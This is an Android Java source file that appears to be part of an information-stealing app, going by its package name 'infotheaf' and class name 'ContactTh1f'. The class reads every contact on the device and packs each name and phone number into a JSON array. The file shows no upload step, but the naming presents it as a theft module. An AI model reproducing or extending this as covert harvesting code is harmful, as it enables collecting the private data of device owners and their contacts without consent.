package com.example.infotheaf;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactTh1f {
    private Context mContext;
    public ContactTh1f(Context mContext) {
        this.mContext = mContext;

    }

    public JSONArray getContectInfo() throws JSONException {
        Cursor cursor = this.mContext.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        JSONArray contacts = new JSONArray();
        while (cursor.moveToNext()) {
            JSONObject contact = new JSONObject();
            // get a contact instance
            String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            // get contact name
            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            contact.put("name", name);

            // get contact phone number
            Cursor phoneCursor = this.mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, null, null);
            while (phoneCursor.moveToNext()) {
                String phone = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                phone = phone.replace("-", "");
                phone = phone.replace(" ", "");
                contact.put("phone", phone);
            }

            contacts.put(contact);
            phoneCursor.close();
        }
        return contacts;
    }
}
